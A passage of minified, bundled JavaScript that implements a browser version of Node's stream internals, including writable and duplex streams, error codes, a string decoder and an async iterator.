                oe -= fe.data.length; fe = fe.next; ) {
                    var pe = fe.data
                      , ye = oe > pe.length ? pe.length : oe;
                    if (pe.copy(ue, ue.length - oe, 0, ye),
                    oe -= ye,
                    oe === 0) {
                        ye === pe.length ? (++he,
                        fe.next ? this.head = fe.next : this.head = this.tail = null) : (this.head = fe,
                        fe.data = pe.slice(ye));
                        break
                    }
                    ++he
                }
                return this.length -= he,
                ue
            }
        }, {
            key: Q,
            value: function(oe, ue) {
                return K(this, M(M({}, ue), {}, {
                    depth: 0,
                    customInspect: !1
                }))
            }
        }]),
        ae
    }(),
    buffer_list
}
var destroy_1$1, hasRequiredDestroy$1;
function requireDestroy$1() {
    if (hasRequiredDestroy$1)
        return destroy_1$1;
    hasRequiredDestroy$1 = 1;
    function _(b, X) {
        var Y = this
          , F = this._readableState && this._readableState.destroyed
          , V = this._writableState && this._writableState.destroyed;
        return F || V ? (X ? X(b) : b && (this._writableState ? this._writableState.errorEmitted || (this._writableState.errorEmitted = !0,
        process$1.nextTick(x, this, b)) : process$1.nextTick(x, this, b)),
        this) : (this._readableState && (this._readableState.destroyed = !0),
        this._writableState && (this._writableState.destroyed = !0),
        this._destroy(b || null, function(K) {
            !X && K ? Y._writableState ? Y._writableState.errorEmitted ? process$1.nextTick(j, Y) : (Y._writableState.errorEmitted = !0,
            process$1.nextTick(M, Y, K)) : process$1.nextTick(M, Y, K) : X ? (process$1.nextTick(j, Y),
            X(K)) : process$1.nextTick(j, Y)
        }),
        this)
    }
    function M(b, X) {
        x(b, X),
        j(b)
    }
    function j(b) {
        b._writableState && !b._writableState.emitClose || b._readableState && !b._readableState.emitClose || b.emit("close")
    }
    function O() {
        this._readableState && (this._readableState.destroyed = !1,
        this._readableState.reading = !1,
        this._readableState.ended = !1,
        this._readableState.endEmitted = !1),
        this._writableState && (this._writableState.destroyed = !1,
        this._writableState.ended = !1,
        this._writableState.ending = !1,
        this._writableState.finalCalled = !1,
        this._writableState.prefinished = !1,
        this._writableState.finished = !1,
        this._writableState.errorEmitted = !1)
    }
    function x(b, X) {
        b.emit("error", X)
    }
    function w(b, X) {
        var Y = b._readableState
          , F = b._writableState;
        Y && Y.autoDestroy || F && F.autoDestroy ? b.destroy(X) : b.emit("error", X)
    }
    return destroy_1$1 = {
        destroy: _,
        undestroy: O,
        errorOrDestroy: w
    },
    destroy_1$1
}
var errorsBrowser = {}, hasRequiredErrorsBrowser;
function requireErrorsBrowser() {
    if (hasRequiredErrorsBrowser)
        return errorsBrowser;
    hasRequiredErrorsBrowser = 1;
    function _(X, Y) {
        X.prototype = Object.create(Y.prototype),
        X.prototype.constructor = X,
        X.__proto__ = Y
    }
    var M = {};
    function j(X, Y, F) {
        F || (F = Error);
        function V(Q, ee, ae) {
            return typeof Y == "string" ? Y : Y(Q, ee, ae)
        }
        var K = function(Q) {
            _(ee, Q);
            function ee(ae, ne, oe) {
                return Q.call(this, V(ae, ne, oe)) || this
            }
            return ee
        }(F);
        K.prototype.name = F.name,
        K.prototype.code = X,
        M[X] = K
    }
    function O(X, Y) {
        if (Array.isArray(X)) {
            var F = X.length;
            return X = X.map(function(V) {
                return String(V)
            }),
            F > 2 ? "one of ".concat(Y, " ").concat(X.slice(0, F - 1).join(", "), ", or ") + X[F - 1] : F === 2 ? "one of ".concat(Y, " ").concat(X[0], " or ").concat(X[1]) : "of ".concat(Y, " ").concat(X[0])
        } else
            return "of ".concat(Y, " ").concat(String(X))
    }
    function x(X, Y, F) {
        return X.substr(0, Y.length) === Y
    }
    function w(X, Y, F) {
        return (F === void 0 || F > X.length) && (F = X.length),
        X.substring(F - Y.length, F) === Y
    }
    function b(X, Y, F) {
        return typeof F != "number" && (F = 0),
        F + Y.length > X.length ? !1 : X.indexOf(Y, F) !== -1
    }
    return j("ERR_INVALID_OPT_VALUE", function(X, Y) {
        return 'The value "' + Y + '" is invalid for option "' + X + '"'
    }, TypeError),
    j("ERR_INVALID_ARG_TYPE", function(X, Y, F) {
        var V;
        typeof Y == "string" && x(Y, "not ") ? (V = "must not be",
        Y = Y.replace(/^not /, "")) : V = "must be";
        var K;
        if (w(X, " argument"))
            K = "The ".concat(X, " ").concat(V, " ").concat(O(Y, "type"));
        else {
            var Q = b(X, ".") ? "property" : "argument";
            K = 'The "'.concat(X, '" ').concat(Q, " ").concat(V, " ").concat(O(Y, "type"))
        }
        return K += ". Received type ".concat(typeof F),
        K
    }, TypeError),
    j("ERR_STREAM_PUSH_AFTER_EOF", "stream.push() after EOF"),
    j("ERR_METHOD_NOT_IMPLEMENTED", function(X) {
        return "The " + X + " method is not implemented"
    }),
    j("ERR_STREAM_PREMATURE_CLOSE", "Premature close"),
    j("ERR_STREAM_DESTROYED", function(X) {
        return "Cannot call " + X + " after a stream was destroyed"
    }),
    j("ERR_MULTIPLE_CALLBACK", "Callback called multiple times"),
    j("ERR_STREAM_CANNOT_PIPE", "Cannot pipe, not readable"),
    j("ERR_STREAM_WRITE_AFTER_END", "write after end"),
    j("ERR_STREAM_NULL_VALUES", "May not write null values to stream", TypeError),
    j("ERR_UNKNOWN_ENCODING", function(X) {
        return "Unknown encoding: " + X
    }, TypeError),
    j("ERR_STREAM_UNSHIFT_AFTER_END_EVENT", "stream.unshift() after end event"),
    errorsBrowser.codes = M,
    errorsBrowser
}
var state, hasRequiredState;
function requireState() {
    if (hasRequiredState)
        return state;
    hasRequiredState = 1;
    var _ = requireErrorsBrowser().codes.ERR_INVALID_OPT_VALUE;
    function M(O, x, w) {
        return O.highWaterMark != null ? O.highWaterMark : x ? O[w] : null
    }
    function j(O, x, w, b) {
        var X = M(x, b, w);
        if (X != null) {
            if (!(isFinite(X) && Math.floor(X) === X) || X < 0) {
                var Y = b ? w : "highWaterMark";
                throw new _(Y,X)
            }
            return Math.floor(X)
        }
        return O.objectMode ? 16 : 16 * 1024
    }
    return state = {
        getHighWaterMark: j
    },
    state
}
var browser$e, hasRequiredBrowser$e;
function requireBrowser$e() {
    if (hasRequiredBrowser$e)
        return browser$e;
    hasRequiredBrowser$e = 1,
    browser$e = _;
    function _(j, O) {
        if (M("noDeprecation"))
            return j;
        var x = !1;
        function w() {
            if (!x) {
                if (M("throwDeprecation"))
                    throw new Error(O);
                M("traceDeprecation") ? console.trace(O) : console.warn(O),
                x = !0
            }
            return j.apply(this, arguments)
        }
        return w
    }
    function M(j) {
        try {
            if (!window.localStorage)
                return !1
        } catch {
            return !1
        }
        var O = window.localStorage[j];
        return O == null ? !1 : String(O).toLowerCase() === "true"
    }
    return browser$e
}
var _stream_writable$1, hasRequired_stream_writable$1;
function require_stream_writable$1() {
    if (hasRequired_stream_writable$1)
        return _stream_writable$1;
    hasRequired_stream_writable$1 = 1,
    _stream_writable$1 = Ae;
    function _(Ie) {
        var Te = this;
        this.next = null,
        this.entry = null,
        this.finish = function() {
            Pe(Te, Ie)
        }
    }
    var M;
    Ae.WritableState = be;
    var j = {
        deprecate: requireBrowser$e()
    }
      , O = requireStreamBrowser$1()
      , x = requireDist$4().Buffer
      , w = (typeof window < "u" || typeof window < "u" ? window : typeof self < "u" ? self : {}).Uint8Array || function() {}
    ;
    function b(Ie) {
        return x.from(Ie)
    }
    function X(Ie) {
        return x.isBuffer(Ie) || Ie instanceof w
    }
    var Y = requireDestroy$1()
      , F = requireState()
      , V = F.getHighWaterMark
      , K = requireErrorsBrowser().codes
      , Q = K.ERR_INVALID_ARG_TYPE
      , ee = K.ERR_METHOD_NOT_IMPLEMENTED
      , ae = K.ERR_MULTIPLE_CALLBACK
      , ne = K.ERR_STREAM_CANNOT_PIPE
      , oe = K.ERR_STREAM_DESTROYED
      , ue = K.ERR_STREAM_NULL_VALUES
      , fe = K.ERR_STREAM_WRITE_AFTER_END
      , he = K.ERR_UNKNOWN_ENCODING
      , pe = Y.errorOrDestroy;
    requireInherits_browser()(Ae, O);
    function ye() {}
    function be(Ie, Te, Le) {
        M = M || require_stream_duplex$1(),
        Ie = Ie || {},
        typeof Le != "boolean" && (Le = Te instanceof M),
        this.objectMode = !!Ie.objectMode,
        Le && (this.objectMode = this.objectMode || !!Ie.writableObjectMode),
        this.highWaterMark = V(this, Ie, "writableHighWaterMark", Le),
        this.finalCalled = !1,
        this.needDrain = !1,
        this.ending = !1,
        this.ended = !1,
        this.finished = !1,
        this.destroyed = !1;
        var Ze = Ie.decodeStrings === !1;
        this.decodeStrings = !Ze,
        this.defaultEncoding = Ie.defaultEncoding || "utf8",
        this.length = 0,
        this.writing = !1,
        this.corked = 0,
        this.sync = !0,
        this.bufferProcessing = !1,
        this.onwrite = function($e) {
            te(Te, $e)
        }
        ,
        this.writecb = null,
        this.writelen = 0,
        this.bufferedRequest = null,
        this.lastBufferedRequest = null,
        this.pendingcb = 0,
        this.prefinished = !1,
        this.errorEmitted = !1,
        this.emitClose = Ie.emitClose !== !1,
        this.autoDestroy = !!Ie.autoDestroy,
        this.bufferedRequestCount = 0,
        this.corkedRequestsFree = new _(this)
    }
    be.prototype.getBuffer = function() {
        for (var Te = this.bufferedRequest, Le = []; Te; )
            Le.push(Te),
            Te = Te.next;
        return Le
    }
    ,
    function() {
        try {
            Object.defineProperty(be.prototype, "buffer", {
                get: j.deprecate(function() {
                    return this.getBuffer()
                }, "_writableState.buffer is deprecated. Use _writableState.getBuffer instead.", "DEP0003")
            })
        } catch {}
    }();
    var xe;
    typeof Symbol == "function" && Symbol.hasInstance && typeof Function.prototype[Symbol.hasInstance] == "function" ? (xe = Function.prototype[Symbol.hasInstance],
    Object.defineProperty(Ae, Symbol.hasInstance, {
        value: function(Te) {
            return xe.call(this, Te) ? !0 : this !== Ae ? !1 : Te && Te._writableState instanceof be
        }
    })) : xe = function(Te) {
        return Te instanceof this
    }
    ;
    function Ae(Ie) {
        M = M || require_stream_duplex$1();
        var Te = this instanceof M;
        if (!Te && !xe.call(Ae, this))
            return new Ae(Ie);
        this._writableState = new be(Ie,this,Te),
        this.writable = !0,
        Ie && (typeof Ie.write == "function" && (this._write = Ie.write),
        typeof Ie.writev == "function" && (this._writev = Ie.writev),
        typeof Ie.destroy == "function" && (this._destroy = Ie.destroy),
        typeof Ie.final == "function" && (this._final = Ie.final)),
        O.call(this)
    }
    Ae.prototype.pipe = function() {
        pe(this, new ne)
    }
    ;
    function Ee(Ie, Te) {
        var Le = new fe;
        pe(Ie, Le),
        process$1.nextTick(Te, Le)
    }
    function Be(Ie, Te, Le, Ze) {
        var $e;
        return Le === null ? $e = new ue : typeof Le != "string" && !Te.objectMode && ($e = new Q("chunk",["string", "Buffer"],Le)),
        $e ? (pe(Ie, $e),
        process$1.nextTick(Ze, $e),
        !1) : !0
    }
    Ae.prototype.write = function(Ie, Te, Le) {
        var Ze = this._writableState
          , $e = !1
          , Ne = !Ze.objectMode && X(Ie);
        return Ne && !x.isBuffer(Ie) && (Ie = b(Ie)),
        typeof Te == "function" && (Le = Te,
        Te = null),
        Ne ? Te = "buffer" : Te || (Te = Ze.defaultEncoding),
        typeof Le != "function" && (Le = ye),
        Ze.ending ? Ee(this, Le) : (Ne || Be(this, Ze, Ie, Le)) && (Ze.pendingcb++,
        $e = q(this, Ze, Ne, Ie, Te, Le)),
        $e
    }
    ,
    Ae.prototype.cork = function() {
        this._writableState.corked++
    }
    ,
    Ae.prototype.uncork = function() {
        var Ie = this._writableState;
        Ie.corked && (Ie.corked--,
        !Ie.writing && !Ie.corked && !Ie.bufferProcessing && Ie.bufferedRequest && re(this, Ie))
    }
    ,
    Ae.prototype.setDefaultEncoding = function(Te) {
        if (typeof Te == "string" && (Te = Te.toLowerCase()),
        !(["hex", "utf8", "utf-8", "ascii", "binary", "base64", "ucs2", "ucs-2", "utf16le", "utf-16le", "raw"].indexOf((Te + "").toLowerCase()) > -1))
            throw new he(Te);
        return this._writableState.defaultEncoding = Te,
        this
    }
    ,
    Object.defineProperty(Ae.prototype, "writableBuffer", {
        enumerable: !1,
        get: function() {
            return this._writableState && this._writableState.getBuffer()
        }
    });
    function ce(Ie, Te, Le) {
        return !Ie.objectMode && Ie.decodeStrings !== !1 && typeof Te == "string" && (Te = x.from(Te, Le)),
        Te
    }
    Object.defineProperty(Ae.prototype, "writableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._writableState.highWaterMark
        }
    });
    function q(Ie, Te, Le, Ze, $e, Ne) {
        if (!Le) {
            var qe = ce(Te, Ze, $e);
            Ze !== qe && (Le = !0,
            $e = "buffer",
            Ze = qe)
        }
        var Ve = Te.objectMode ? 1 : Ze.length;
        Te.length += Ve;
        var lt = Te.length < Te.highWaterMark;
        if (lt || (Te.needDrain = !0),
        Te.writing || Te.corked) {
            var nt = Te.lastBufferedRequest;
            Te.lastBufferedRequest = {
                chunk: Ze,
                encoding: $e,
                isBuf: Le,
                callback: Ne,
                next: null
            },
            nt ? nt.next = Te.lastBufferedRequest : Te.bufferedRequest = Te.lastBufferedRequest,
            Te.bufferedRequestCount += 1
        } else
            L(Ie, Te, !1, Ve, Ze, $e, Ne);
        return lt
    }
    function L(Ie, Te, Le, Ze, $e, Ne, qe) {
        Te.writelen = Ze,
        Te.writecb = qe,
        Te.writing = !0,
        Te.sync = !0,
        Te.destroyed ? Te.onwrite(new oe("write")) : Le ? Ie._writev($e, Te.onwrite) : Ie._write($e, Ne, Te.onwrite),
        Te.sync = !1
    }
    function U(Ie, Te, Le, Ze, $e) {
        --Te.pendingcb,
        Le ? (process$1.nextTick($e, Ze),
        process$1.nextTick(ge, Ie, Te),
        Ie._writableState.errorEmitted = !0,
        pe(Ie, Ze)) : ($e(Ze),
        Ie._writableState.errorEmitted = !0,
        pe(Ie, Ze),
        ge(Ie, Te))
    }
    function Z(Ie) {
        Ie.writing = !1,
        Ie.writecb = null,
        Ie.length -= Ie.writelen,
        Ie.writelen = 0
    }
    function te(Ie, Te) {
        var Le = Ie._writableState
          , Ze = Le.sync
          , $e = Le.writecb;
        if (typeof $e != "function")
            throw new ae;
        if (Z(Le),
        Te)
            U(Ie, Le, Ze, Te, $e);
        else {
            var Ne = $(Le) || Ie.destroyed;
            !Ne && !Le.corked && !Le.bufferProcessing && Le.bufferedRequest && re(Ie, Le),
            Ze ? process$1.nextTick(se, Ie, Le, Ne, $e) : se(Ie, Le, Ne, $e)
        }
    }
    function se(Ie, Te, Le, Ze) {
        Le || de(Ie, Te),
        Te.pendingcb--,
        Ze(),
        ge(Ie, Te)
    }
    function de(Ie, Te) {
        Te.length === 0 && Te.needDrain && (Te.needDrain = !1,
        Ie.emit("drain"))
    }
    function re(Ie, Te) {
        Te.bufferProcessing = !0;
        var Le = Te.bufferedRequest;
        if (Ie._writev && Le && Le.next) {
            var Ze = Te.bufferedRequestCount
              , $e = new Array(Ze)
              , Ne = Te.corkedRequestsFree;
            Ne.entry = Le;
            for (var qe = 0, Ve = !0; Le; )
                $e[qe] = Le,
                Le.isBuf || (Ve = !1),
                Le = Le.next,
                qe += 1;
            $e.allBuffers = Ve,
            L(Ie, Te, !0, Te.length, $e, "", Ne.finish),
            Te.pendingcb++,
            Te.lastBufferedRequest = null,
            Ne.next ? (Te.corkedRequestsFree = Ne.next,
            Ne.next = null) : Te.corkedRequestsFree = new _(Te),
            Te.bufferedRequestCount = 0
        } else {
            for (; Le; ) {
                var lt = Le.chunk
                  , nt = Le.encoding
                  , je = Le.callback
                  , Ke = Te.objectMode ? 1 : lt.length;
                if (L(Ie, Te, !1, Ke, lt, nt, je),
                Le = Le.next,
                Te.bufferedRequestCount--,
                Te.writing)
                    break
            }
            Le === null && (Te.lastBufferedRequest = null)
        }
        Te.bufferedRequest = Le,
        Te.bufferProcessing = !1
    }
    Ae.prototype._write = function(Ie, Te, Le) {
        Le(new ee("_write()"))
    }
    ,
    Ae.prototype._writev = null,
    Ae.prototype.end = function(Ie, Te, Le) {
        var Ze = this._writableState;
        return typeof Ie == "function" ? (Le = Ie,
        Ie = null,
        Te = null) : typeof Te == "function" && (Le = Te,
        Te = null),
        Ie != null && this.write(Ie, Te),
        Ze.corked && (Ze.corked = 1,
        this.uncork()),
        Ze.ending || Re(this, Ze, Le),
        this
    }
    ,
    Object.defineProperty(Ae.prototype, "writableLength", {
        enumerable: !1,
        get: function() {
            return this._writableState.length
        }
    });
    function $(Ie) {
        return Ie.ending && Ie.length === 0 && Ie.bufferedRequest === null && !Ie.finished && !Ie.writing
    }
    function ie(Ie, Te) {
        Ie._final(function(Le) {
            Te.pendingcb--,
            Le && pe(Ie, Le),
            Te.prefinished = !0,
            Ie.emit("prefinish"),
            ge(Ie, Te)
        })
    }
    function ve(Ie, Te) {
        !Te.prefinished && !Te.finalCalled && (typeof Ie._final == "function" && !Te.destroyed ? (Te.pendingcb++,
        Te.finalCalled = !0,
        process$1.nextTick(ie, Ie, Te)) : (Te.prefinished = !0,
        Ie.emit("prefinish")))
    }
    function ge(Ie, Te) {
        var Le = $(Te);
        if (Le && (ve(Ie, Te),
        Te.pendingcb === 0 && (Te.finished = !0,
        Ie.emit("finish"),
        Te.autoDestroy))) {
            var Ze = Ie._readableState;
            (!Ze || Ze.autoDestroy && Ze.endEmitted) && Ie.destroy()
        }
        return Le
    }
    function Re(Ie, Te, Le) {
        Te.ending = !0,
        ge(Ie, Te),
        Le && (Te.finished ? process$1.nextTick(Le) : Ie.once("finish", Le)),
        Te.ended = !0,
        Ie.writable = !1
    }
    function Pe(Ie, Te, Le) {
        var Ze = Ie.entry;
        for (Ie.entry = null; Ze; ) {
            var $e = Ze.callback;
            Te.pendingcb--,
            $e(Le),
            Ze = Ze.next
        }
        Te.corkedRequestsFree.next = Ie
    }
    return Object.defineProperty(Ae.prototype, "destroyed", {
        enumerable: !1,
        get: function() {
            return this._writableState === void 0 ? !1 : this._writableState.destroyed
        },
        set: function(Te) {
            this._writableState && (this._writableState.destroyed = Te)
        }
    }),
    Ae.prototype.destroy = Y.destroy,
    Ae.prototype._undestroy = Y.undestroy,
    Ae.prototype._destroy = function(Ie, Te) {
        Te(Ie)
    }
    ,
    _stream_writable$1
}
var _stream_duplex$1, hasRequired_stream_duplex$1;
function require_stream_duplex$1() {
    if (hasRequired_stream_duplex$1)
        return _stream_duplex$1;
    hasRequired_stream_duplex$1 = 1;
    var _ = Object.keys || function(F) {
        var V = [];
        for (var K in F)
            V.push(K);
        return V
    }
    ;
    _stream_duplex$1 = b;
    var M = require_stream_readable$1()
      , j = require_stream_writable$1();
    requireInherits_browser()(b, M);
    for (var O = _(j.prototype), x = 0; x < O.length; x++) {
        var w = O[x];
        b.prototype[w] || (b.prototype[w] = j.prototype[w])
    }
    function b(F) {
        if (!(this instanceof b))
            return new b(F);
        M.call(this, F),
        j.call(this, F),
        this.allowHalfOpen = !0,
        F && (F.readable === !1 && (this.readable = !1),
        F.writable === !1 && (this.writable = !1),
        F.allowHalfOpen === !1 && (this.allowHalfOpen = !1,
        this.once("end", X)))
    }
    Object.defineProperty(b.prototype, "writableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._writableState.highWaterMark
        }
    }),
    Object.defineProperty(b.prototype, "writableBuffer", {
        enumerable: !1,
        get: function() {
            return this._writableState && this._writableState.getBuffer()
        }
    }),
    Object.defineProperty(b.prototype, "writableLength", {
        enumerable: !1,
        get: function() {
            return this._writableState.length
        }
    });
    function X() {
        this._writableState.ended || process$1.nextTick(Y, this)
    }
    function Y(F) {
        F.end()
    }
    return Object.defineProperty(b.prototype, "destroyed", {
        enumerable: !1,
        get: function() {
            return this._readableState === void 0 || this._writableState === void 0 ? !1 : this._readableState.destroyed && this._writableState.destroyed
        },
        set: function(V) {
            this._readableState === void 0 || this._writableState === void 0 || (this._readableState.destroyed = V,
            this._writableState.destroyed = V)
        }
    }),
    _stream_duplex$1
}
var string_decoder = {}, hasRequiredString_decoder;
function requireString_decoder() {
    if (hasRequiredString_decoder)
        return string_decoder;
    hasRequiredString_decoder = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = _.isEncoding || function(ue) {
        switch (ue = "" + ue,
        ue && ue.toLowerCase()) {
        case "hex":
        case "utf8":
        case "utf-8":
        case "ascii":
        case "binary":
        case "base64":
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
        case "raw":
            return !0;
        default:
            return !1
        }
    }
    ;
    function j(ue) {
        if (!ue)
            return "utf8";
        for (var fe; ; )
            switch (ue) {
            case "utf8":
            case "utf-8":
                return "utf8";
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
                return "utf16le";
            case "latin1":
            case "binary":
                return "latin1";
            case "base64":
            case "ascii":
            case "hex":
                return ue;
            default:
                if (fe)
                    return;
                ue = ("" + ue).toLowerCase(),
                fe = !0
            }
    }
    function O(ue) {
        var fe = j(ue);
        if (typeof fe != "string" && (_.isEncoding === M || !M(ue)))
            throw new Error("Unknown encoding: " + ue);
        return fe || ue
    }
    string_decoder.StringDecoder = x;
    function x(ue) {
        this.encoding = O(ue);
        var fe;
        switch (this.encoding) {
        case "utf16le":
            this.text = K,
            this.end = Q,
            fe = 4;
            break;
        case "utf8":
            this.fillLast = Y,
            fe = 4;
            break;
        case "base64":
            this.text = ee,
            this.end = ae,
            fe = 3;
            break;
        default:
            this.write = ne,
            this.end = oe;
            return
        }
        this.lastNeed = 0,
        this.lastTotal = 0,
        this.lastChar = _.allocUnsafe(fe)
    }
    x.prototype.write = function(ue) {
        if (ue.length === 0)
            return "";
        var fe, he;
        if (this.lastNeed) {
            if (fe = this.fillLast(ue),
            fe === void 0)
                return "";
            he = this.lastNeed,
            this.lastNeed = 0
        } else
            he = 0;
        return he < ue.length ? fe ? fe + this.text(ue, he) : this.text(ue, he) : fe || ""
    }
    ,
    x.prototype.end = V,
    x.prototype.text = F,
    x.prototype.fillLast = function(ue) {
        if (this.lastNeed <= ue.length)
            return ue.copy(this.lastChar, this.lastTotal - this.lastNeed, 0, this.lastNeed),
            this.lastChar.toString(this.encoding, 0, this.lastTotal);
        ue.copy(this.lastChar, this.lastTotal - this.lastNeed, 0, ue.length),
        this.lastNeed -= ue.length
    }
    ;
    function w(ue) {
        return ue <= 127 ? 0 : ue >> 5 === 6 ? 2 : ue >> 4 === 14 ? 3 : ue >> 3 === 30 ? 4 : ue >> 6 === 2 ? -1 : -2
    }
    function b(ue, fe, he) {
        var pe = fe.length - 1;
        if (pe < he)
            return 0;
        var ye = w(fe[pe]);
        return ye >= 0 ? (ye > 0 && (ue.lastNeed = ye - 1),
        ye) : --pe < he || ye === -2 ? 0 : (ye = w(fe[pe]),
        ye >= 0 ? (ye > 0 && (ue.lastNeed = ye - 2),
        ye) : --pe < he || ye === -2 ? 0 : (ye = w(fe[pe]),
        ye >= 0 ? (ye > 0 && (ye === 2 ? ye = 0 : ue.lastNeed = ye - 3),
        ye) : 0))
    }
    function X(ue, fe, he) {
        if ((fe[0] & 192) !== 128)
            return ue.lastNeed = 0,
            "";
        if (ue.lastNeed > 1 && fe.length > 1) {
            if ((fe[1] & 192) !== 128)
                return ue.lastNeed = 1,
                "";
            if (ue.lastNeed > 2 && fe.length > 2 && (fe[2] & 192) !== 128)
                return ue.lastNeed = 2,
                ""
        }
    }
    function Y(ue) {
        var fe = this.lastTotal - this.lastNeed
          , he = X(this, ue);
        if (he !== void 0)
            return he;
        if (this.lastNeed <= ue.length)
            return ue.copy(this.lastChar, fe, 0, this.lastNeed),
            this.lastChar.toString(this.encoding, 0, this.lastTotal);
        ue.copy(this.lastChar, fe, 0, ue.length),
        this.lastNeed -= ue.length
    }
    function F(ue, fe) {
        var he = b(this, ue, fe);
        if (!this.lastNeed)
            return ue.toString("utf8", fe);
        this.lastTotal = he;
        var pe = ue.length - (he - this.lastNeed);
        return ue.copy(this.lastChar, 0, pe),
        ue.toString("utf8", fe, pe)
    }
    function V(ue) {
        var fe = ue && ue.length ? this.write(ue) : "";
        return this.lastNeed ? fe + "" : fe
    }
    function K(ue, fe) {
        if ((ue.length - fe) % 2 === 0) {
            var he = ue.toString("utf16le", fe);
            if (he) {
                var pe = he.charCodeAt(he.length - 1);
                if (pe >= 55296 && pe <= 56319)
                    return this.lastNeed = 2,
                    this.lastTotal = 4,
                    this.lastChar[0] = ue[ue.length - 2],
                    this.lastChar[1] = ue[ue.length - 1],
                    he.slice(0, -1)
            }
            return he
        }
        return this.lastNeed = 1,
        this.lastTotal = 2,
        this.lastChar[0] = ue[ue.length - 1],
        ue.toString("utf16le", fe, ue.length - 1)
    }
    function Q(ue) {
        var fe = ue && ue.length ? this.write(ue) : "";
        if (this.lastNeed) {
            var he = this.lastTotal - this.lastNeed;
            return fe + this.lastChar.toString("utf16le", 0, he)
        }
        return fe
    }
    function ee(ue, fe) {
        var he = (ue.length - fe) % 3;
        return he === 0 ? ue.toString("base64", fe) : (this.lastNeed = 3 - he,
        this.lastTotal = 3,
        he === 1 ? this.lastChar[0] = ue[ue.length - 1] : (this.lastChar[0] = ue[ue.length - 2],
        this.lastChar[1] = ue[ue.length - 1]),
        ue.toString("base64", fe, ue.length - he))
    }
    function ae(ue) {
        var fe = ue && ue.length ? this.write(ue) : "";
        return this.lastNeed ? fe + this.lastChar.toString("base64", 0, 3 - this.lastNeed) : fe
    }
    function ne(ue) {
        return ue.toString(this.encoding)
    }
    function oe(ue) {
        return ue && ue.length ? this.write(ue) : ""
    }
    return string_decoder
}
var endOfStream, hasRequiredEndOfStream;
function requireEndOfStream() {
    if (hasRequiredEndOfStream)
        return endOfStream;
    hasRequiredEndOfStream = 1;
    var _ = requireErrorsBrowser().codes.ERR_STREAM_PREMATURE_CLOSE;
    function M(w) {
        var b = !1;
        return function() {
            if (!b) {
                b = !0;
                for (var X = arguments.length, Y = new Array(X), F = 0; F < X; F++)
                    Y[F] = arguments[F];
                w.apply(this, Y)
            }
        }
    }
    function j() {}
    function O(w) {
        return w.setHeader && typeof w.abort == "function"
    }
    function x(w, b, X) {
        if (typeof b == "function")
            return x(w, null, b);
        b || (b = {}),
        X = M(X || j);
        var Y = b.readable || b.readable !== !1 && w.readable
          , F = b.writable || b.writable !== !1 && w.writable
          , V = function() {
            w.writable || Q()
        }
          , K = w._writableState && w._writableState.finished
          , Q = function() {
            F = !1,
            K = !0,
            Y || X.call(w)
        }
          , ee = w._readableState && w._readableState.endEmitted
          , ae = function() {
            Y = !1,
            ee = !0,
            F || X.call(w)
        }
          , ne = function(he) {
            X.call(w, he)
        }
          , oe = function() {
            var he;
            if (Y && !ee)
                return (!w._readableState || !w._readableState.ended) && (he = new _),
                X.call(w, he);
            if (F && !K)
                return (!w._writableState || !w._writableState.ended) && (he = new _),
                X.call(w, he)
        }
          , ue = function() {
            w.req.on("finish", Q)
        };
        return O(w) ? (w.on("complete", Q),
        w.on("abort", oe),
        w.req ? ue() : w.on("request", ue)) : F && !w._writableState && (w.on("end", V),
        w.on("close", V)),
        w.on("end", ae),
        w.on("finish", Q),
        b.error !== !1 && w.on("error", ne),
        w.on("close", oe),
        function() {
            w.removeListener("complete", Q),
            w.removeListener("abort", oe),
            w.removeListener("request", ue),
            w.req && w.req.removeListener("finish", Q),
            w.removeListener("end", V),
            w.removeListener("close", V),
            w.removeListener("finish", Q),
            w.removeListener("end", ae),
            w.removeListener("error", ne),
            w.removeListener("close", oe)
        }
    }
    return endOfStream = x,
    endOfStream
}
var async_iterator, hasRequiredAsync_iterator;
function requireAsync_iterator() {
    if (hasRequiredAsync_iterator)
        return async_iterator;
    hasRequiredAsync_iterator = 1;
    var _;
    function M(he, pe, ye) {
        return pe = j(pe),
        pe in he ? Object.defineProperty(he, pe, {
            value: ye,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : he[pe] = ye,
        he
    }
    function j(he) {
        var pe = O(he, "string");
        return typeof pe == "symbol" ? pe : String(pe)
    }
    function O(he, pe) {
        if (typeof he != "object" || he === null)
            return he;
        var ye = he[Symbol.toPrimitive];
        if (ye !== void 0) {
            var be = ye.call(he, pe);
            if (typeof be != "object")
                return be;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return (pe === "string" ? String : Number)(he)
    }
    var x = requireEndOfStream()
      , w = Symbol("lastResolve")
      , b = Symbol("lastReject")
      , X = Symbol("error")
      , Y = Symbol("ended")
      , F = Symbol("lastPromise")
      , V = Symbol("handlePromise")
      , K = Symbol("stream");
    function Q(he, pe) {
        return {
            value: he,
            done: pe
        }
    }
    function ee(he) {
        var pe = he[w];
        if (pe !== null) {
            var ye = he[K].read();
            ye !== null && (he[F] = null,
            he[w] = null,
            he[b] = null,
            pe(Q(ye, !1)))
        }
    }
    function ae(he) {
        process$1.nextTick(ee, he)
    }
    function ne(he, pe) {
        return function(ye, be) {
            he.then(function() {
                if (pe[Y]) {
                    ye(Q(void 0, !0));
                    return
                }
                pe[V](ye, be)
            }, be)
        }
    }
    var oe = Object.getPrototypeOf(function() {})
      , ue = Object.setPrototypeOf((_ = {
        get stream() {
            return this[K]
        },
        next: function() {
            var pe = this
              , ye = this[X];
            if (ye !== null)
                return Promise.reject(ye);
            if (this[Y])
                return Promise.resolve(Q(void 0, !0));
            if (this[K].destroyed)
                return new Promise(function(Ee, Be) {
                    process$1.nextTick(function() {
                        pe[X] ? Be(pe[X]) : Ee(Q(void 0, !0))
                    })
                }
                );
            var be = this[F], xe;
            if (be)
                xe = new Promise(ne(be, this));
            else {
                var Ae = this[K].read();
                if (Ae !== null)
                    return Promise.resolve(Q(Ae, !1));
                xe = new Promise(this[V])
            }
            return this[F] = xe,
            xe
        }
    },
    M(_, Symbol.asyncIterator, function() {
        return this
    }),
    M(_, "return", function() {
        var pe = this;
        return new Promise(function(ye, be) {
            pe[K].destroy(null, function(xe) {
                if (xe) {
                    be(xe);
                    return
                }
                ye(Q(void 0, !0))
            })
        }
        )
    }),
    _), oe)
      , fe = function(pe) {
